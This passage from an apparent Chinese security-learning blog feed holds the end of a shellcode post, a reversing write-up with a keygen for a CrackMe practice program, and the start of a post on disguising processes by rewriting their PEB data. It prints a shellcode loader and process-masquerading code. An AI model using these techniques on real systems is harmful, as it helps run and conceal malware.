c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">HANDLE hBin = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;sh.bin&quot;</span>, GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;<br>DWORD dwWrite;<br><span class="hljs-built_in">WriteFile</span>(hBin, ShellcodeStart, dwSize, &amp;dwWrite, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hBin);<br></code></pre></div></td></tr></table></figure><h5 id="shellcode加载器"><a href="#shellcode加载器" class="headerlink" title="shellcode加载器"></a>shellcode加载器</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(argv[<span class="hljs-number">1</span>], GENERIC_READ, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwSize;<br>dwSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID lpAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;virtual failed\n&quot;</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwRead;<br><span class="hljs-built_in">ReadFile</span>(hFile, lpAddr, dwSize, &amp;dwRead, <span class="hljs-number">0</span>);<br>__asm &#123;<br>call lpAddr<br>&#125;<br>_flushall();<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/21.png"></p>]]></content>
    
    
    <categories>
      
      <category>ShellCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>ShellCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-003</title>
    <link href="/2021/07/21/160CrackMe-003/"/>
    <url>/2021/07/21/160CrackMe-003/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序看到需要输入用户名和序列号尝试输入后提示错误</p><p><img src="/2021/07/21/160CrackMe-003/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用工具查看，发现未加壳，语言是VB。</p><p><img src="/2021/07/21/160CrackMe-003/2.png"></p><p>用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0]</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004081E3</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">18</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaHresu&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaHresultCheckObj<br><span class="hljs-attribute">004081E9</span>   &gt;  <span class="hljs-number">8</span>B<span class="hljs-number">95</span> <span class="hljs-number">50</span>FFFFFF mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xB<span class="hljs-number">0</span>]<br><span class="hljs-attribute">004081EF</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>C]          ;  获取输入的name<br><span class="hljs-attribute">004081F2</span>   .  <span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-number">00004000</span> ???<br><span class="hljs-attribute">004081F3</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">1</span>A          mov ebx,dword ptr ds:[edx]               ; |<br><span class="hljs-attribute">004081F5</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">8</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaLenBs&gt;; \获取name长度<br><span class="hljs-attribute">004081FB</span>   .  <span class="hljs-number">8</span>BF<span class="hljs-number">8</span>          mov edi,eax<br><span class="hljs-attribute">004081FD</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D E<span class="hljs-number">8</span>       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">18</span>]<br><span class="hljs-attribute">00408200</span>   .  <span class="hljs-number">69</span>FF <span class="hljs-number">385</span>B<span class="hljs-number">0100</span> imul edi,edi,<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span>                     ;  长度乘以<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span><br><span class="hljs-attribute">00408206</span>   .  <span class="hljs-number">51</span>            push ecx                                 ; /String = <span class="hljs-number">091</span>C<span class="hljs-number">840</span>A ???<br><span class="hljs-attribute">00408207</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> B<span class="hljs-number">7050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span>                     ; |<br><span class="hljs-attribute">0040820D</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">0</span>CB<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.#<span class="hljs-number">516</span>&gt;]     ; \获取输入name的第一次ascii码<br><span class="hljs-attribute">00408213</span>   .  <span class="hljs-number">0</span>FBFD<span class="hljs-number">0</span>        movsx edx,ax<br><span class="hljs-attribute">00408216</span>   .  <span class="hljs-number">03</span>FA          add edi,edx                              ;  长度计算后加上name[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00408218</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> A<span class="hljs-number">6050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span><br><span class="hljs-attribute">0040821E</span>   .  <span class="hljs-number">57</span>            push edi                                 ;  Msvbvm<span class="hljs-number">50</span>.__vbaObjSet<br><span class="hljs-attribute">0040821F</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">4</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrI<span class="hljs-number">4</span>&gt;;  转字符串（十进制）<br></code></pre></div></td></tr></table></figure><p>然后将结果转为浮点数执行了几次操作。</p><p>第一次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004082E9</span>   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  转为浮点数<br><span class="hljs-number">004082</span>EF   .  D905 <span class="hljs-number">08104000</span> fld dword ptr ds:[<span class="hljs-number">0</span>x401008]              ;  １０<br><span class="hljs-number">004082</span>F5   .  <span class="hljs-number">833</span>D <span class="hljs-number">00904000</span>&gt;cmp dword ptr ds:[<span class="hljs-number">0</span>x409000],<span class="hljs-number">0</span>x0<br><span class="hljs-number">004082</span>FC   .  <span class="hljs-number">75</span> <span class="hljs-number">08</span>         jnz short AfKayAs_.<span class="hljs-number">00408306</span><br><span class="hljs-number">004082</span>FE   .  D835 <span class="hljs-number">0</span>C104000 fdiv dword ptr ds:[<span class="hljs-number">0</span>x40100C]             ;  １０／５<br><span class="hljs-symbol">00408304 </span>  .  EB <span class="hljs-number">0</span>B         jmp short AfKayAs_.<span class="hljs-number">00408311</span><br><span class="hljs-symbol">00408306 </span>  &gt;  FF35 <span class="hljs-number">0</span>C104000 push dword ptr ds:[<span class="hljs-number">0</span>x40100C]<br><span class="hljs-number">0040830</span>C   .  E8 <span class="hljs-number">578</span>DFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;<br><span class="hljs-symbol">00408311 </span>  &gt;  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408314 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408316 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408318 </span>  .  <span class="hljs-number">0</span>F85 A1040000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040831</span>E   .  DEC1          faddp st(<span class="hljs-number">1</span>),st                           ;  ＋２<br><span class="hljs-symbol">00408320 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408322 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408324 </span>  .  <span class="hljs-number">0</span>F85 <span class="hljs-number">95040000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040832</span>A   .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-number">0040832</span>D   .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  转回去<br></code></pre></div></td></tr></table></figure><p>第二次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004083</span>F5   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  Msvbvm50.__vbaR8Str<br><span class="hljs-number">004083</span>FB   .  DC0D <span class="hljs-number">10104000</span> fmul qword ptr ds:[<span class="hljs-number">0</span>x401010]             ;  ＊３<br><span class="hljs-symbol">00408401 </span>  .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408404 </span>  .  DC25 <span class="hljs-number">18104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x401018]             ;  －２<br><span class="hljs-number">0040840</span>A   .  DFE0          fstsw ax<br><span class="hljs-number">0040840</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040840</span>E   .  <span class="hljs-number">0</span>F85 AB030000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408414 </span>  .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-symbol">00408417 </span>  .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  Msvbvm50.__vbaStrR8<br></code></pre></div></td></tr></table></figure><p>第三次</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004084DF</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">74</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str<br><span class="hljs-attribute">004084E5</span>   .  DC<span class="hljs-number">25</span> <span class="hljs-number">20104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">401020</span>]             ;  ＋１５<br><span class="hljs-attribute">004084EB</span>   .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">004084EE</span>   .  DFE<span class="hljs-number">0</span>          fstsw ax<br><span class="hljs-attribute">004084F0</span>   .  A<span class="hljs-number">8</span> <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-attribute">004084F2</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">85</span> C<span class="hljs-number">7020000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-attribute">004084F8</span>   .  DD<span class="hljs-number">1</span>C<span class="hljs-number">24</span>        fstp qword ptr ss:[esp]<br><span class="hljs-attribute">004084FB</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">48</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span>&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><p>最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004085</span>F1   .  DCBD <span class="hljs-number">1</span>CFFFFFF fdivr qword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]            ;  计算的ｓｅｒｉａｌ／输入<br><span class="hljs-number">004085</span>F7   .  EB <span class="hljs-number">11</span>         jmp short AfKayAs_.<span class="hljs-number">0040860</span>A<br><span class="hljs-number">004085</span>F9   &gt;  FFB5 <span class="hljs-number">20</span>FFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE0]<br><span class="hljs-number">004085</span>FF   .  FFB5 <span class="hljs-number">1</span>CFFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]<br><span class="hljs-symbol">00408605 </span>  .  E8 <span class="hljs-number">888</span>AFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;<br><span class="hljs-number">0040860</span>A   &gt;  DFE0          fstsw ax<br><span class="hljs-number">0040860</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040860</span>E   .  <span class="hljs-number">0</span>F85 AB010000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408614 </span>  .  FF15 <span class="hljs-number">34</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;;  Msvbvm50.__vbaFpR8<br><span class="hljs-number">0040861</span>A   .  DC1D <span class="hljs-number">28104000</span> fcomp qword ptr ds:[<span class="hljs-number">0</span>x401028]            ;  结果与１进行比较<br><span class="hljs-symbol">00408620 </span>  .  DFE0          fstsw ax                                 ;  将寄存器的值传给ＡＸ<br><span class="hljs-symbol">00408622 </span>  .  F6C4 <span class="hljs-number">40</span>       test ah,<span class="hljs-number">0</span>x40                             ;  比较ａｈ值与０ｘ４０<br><span class="hljs-symbol">00408625 </span>  .  <span class="hljs-number">74</span> <span class="hljs-number">07</span>         je short AfKayAs_.<span class="hljs-number">0040862</span>E               ;  若不相等就会跳到清空ｅｓｉ处<br><span class="hljs-symbol">00408627 </span>  .  BE <span class="hljs-number">01000000</span>   mov esi,<span class="hljs-number">0</span>x1                              ;  相等ｅｓｉ赋值１<br><span class="hljs-number">0040862</span>C   .  EB <span class="hljs-number">02</span>         jmp short AfKayAs_.<span class="hljs-number">00408630</span><br><span class="hljs-number">0040862</span>E   &gt;  <span class="hljs-number">33</span>F6          <span class="hljs-keyword">xor</span> esi,esi                              ;  清空寄存器<br></code></pre></div></td></tr></table></figure><p>这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax</p><table><thead><tr><th>比较结果</th><th>C3</th><th>C0</th></tr></thead><tbody><tr><td>ST(0)&gt;源操作数</td><td>0</td><td>0</td></tr><tr><td>ST(0)&lt;源操作数</td><td>0</td><td>1</td></tr><tr><td>ST(0)=源操作数</td><td>1</td><td>0</td></tr><tr><td>ST(0)不可比较</td><td>1</td><td>1</td></tr></tbody></table><p>看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1</p><p><img src="/2021/07/21/160CrackMe-003/3.png"></p><p>计算器转换一下看的仔细</p><p><img src="/2021/07/21/160CrackMe-003/4.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>    gets_s(name, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>    <span class="hljs-keyword">int</span> serial;<br>    serial = len * <span class="hljs-number">0x15B38</span>;<br>    serial += name[<span class="hljs-number">0</span>];<br>    serial = (serial + <span class="hljs-number">2</span>) * <span class="hljs-number">3</span> - <span class="hljs-number">2</span> + <span class="hljs-number">15</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;serial:%d\n&quot;</span>, serial);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/21/160CrackMe-003/5.png"></p><p>输入正确的serial</p><p><img src="/2021/07/21/160CrackMe-003/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-进程伪装</title>
    <link href="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/"/>
    <url>/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h4 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h4><p>进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。</p><p>查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/1.png"></p><p>继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\Windows\system32\notepad.exe”</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/2.png"></p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><ul><li>获取PEB地址</li><li>获取ProcessParameters</li><li>写入伪装信息</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;process.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* typedef_NtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PVOID ProcessInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">IN ULONG ProcessInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PULONG ReturnLength OPTIONAL</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-comment">/*PID：需要进行伪装的进程PID</span><br><span class="hljs-comment">* lpwszpath：伪装路径</span><br><span class="hljs-comment">* lpwszcmd：伪装命令行</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DisguiseProcess</span><span class="hljs-params">(DWORD PID, <span class="hljs-keyword">wchar_t</span>* lpwszPath, <span class="hljs-keyword">wchar_t</span>* lpwszCmd)</span> </span>&#123;<br><span class="hljs-comment">//打开进程获取句柄</span><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>typedef_NtQueryInformationProcess NtQueryInformationProcess = <span class="hljs-literal">NULL</span>;<br>PROCESS_BASIC_INFORMATION pbi = &#123; <span class="hljs-number">0</span> &#125;;<br>PEB peb = &#123; <span class="hljs-number">0</span> &#125;;<br>RTL_USER_PROCESS_PARAMETERS Param = &#123; <span class="hljs-number">0</span> &#125;;<br>USHORT usCmdLen = <span class="hljs-number">0</span>;<br>USHORT usPathLen = <span class="hljs-number">0</span>;<br>NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><span class="hljs-keyword">if</span> (NtQueryInformationProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, <span class="hljs-keyword">sizeof</span>(pbi), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取进程信息失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取peb的地址</span><br>ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="hljs-keyword">sizeof</span>(peb), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取ProcessParameters地址</span><br>ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, <span class="hljs-keyword">sizeof</span>(Param), <span class="hljs-literal">NULL</span>);<br>usCmdLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * 